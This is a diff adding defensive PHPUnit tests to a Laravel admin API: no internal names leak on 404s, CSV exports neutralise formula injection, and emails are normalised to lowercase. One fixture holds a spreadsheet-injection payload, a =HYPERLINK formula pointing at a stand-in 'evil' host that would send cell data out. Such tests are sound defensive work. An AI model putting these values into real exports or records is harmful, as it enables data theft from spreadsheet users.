@@ -48,6 +48,19 @@ class AccessAdminApiTest extends AccessTestCase
         $this->getJson('/api/access/users')->assertStatus(401);
     }
 
+    public function test_a_route_binding_miss_returns_a_generic_404_without_internal_names(): void
+    {
+        $this->actingAsManager();
+
+        $response = $this->getJson('/api/access/users/999999')
+            ->assertStatus(404)
+            ->assertJsonPath('detail', __('api.errors.http.not_found'));
+
+        // The framework's binding-miss message ("No query results for model [App\Models\User] ...") must never surface.
+        $this->assertStringNotContainsString('App\\', $response->getContent());
+        $this->assertStringNotContainsString('No query results', $response->getContent());
+    }
+
     public function test_users_are_listed_with_roles_and_direct_permissions(): void
     {
         $admin = $this->actingAsManager();
@@ -104,6 +117,25 @@ class AccessAdminApiTest extends AccessTestCase
         $this->assertStringNotContainsString('other@example.com', $csv);
     }
 
+    public function test_exported_cells_cannot_execute_as_spreadsheet_formulas(): void
+    {
+        $this->actingAsManager();
+        $this->createUser([
+            'first_name' => '=HYPERLINK("http://evil/"&A1)',
+            'last_name' => '+SUM(A1:A9)',
+            'email' => 'formula@example.com',
+        ]);
+
+        $csv = $this->get('/api/access/users/export')->assertOk()->streamedContent();
+
+        // User-controlled cells that would evaluate get the apostrophe prefix...
+        $this->assertStringContainsString("'=HYPERLINK", $csv);
+        $this->assertStringContainsString(",'+SUM(A1:A9),", $csv);
+        // ...and none is left starting with a live formula trigger.
+        $this->assertStringNotContainsString('"=HYPERLINK', $csv);
+        $this->assertStringNotContainsString(',+SUM', $csv);
+    }
+
     public function test_a_user_is_created_with_a_temporary_password_and_roles(): void
     {
         $this->actingAsManager();
@@ -136,6 +168,23 @@ class AccessAdminApiTest extends AccessTestCase
             'role_ids' => [$superAdmin->getKey()],
         ])->assertStatus(422);
         $this->assertNull(User::where('email', 'rogue@example.com')->first());
+    }
+
+    public function test_created_emails_are_stored_lowercase_and_case_duplicates_are_rejected(): void
+    {
+        $this->actingAsManager();
+
+        $this->postJson('/api/access/users', [
+            'first_name' => 'Mixed', 'last_name' => 'Case', 'email' => 'Mixed.Case@Example.COM',
+        ])->assertStatus(201);
+
+        // The model mutator stores lowercase, whatever casing the admin typed.
+        $this->assertNotNull(User::where('email', 'mixed.case@example.com')->first());
+
+        // And the normalized unique rule catches a case-variant duplicate.
+        $this->postJson('/api/access/users', [
+            'first_name' => 'Dupe', 'last_name' => 'Case', 'email' => 'MIXED.CASE@example.com',
+        ])->assertStatus(422);
     }
 
     public function test_a_user_is_created_with_an_invitation_instead_of_a_password(): void
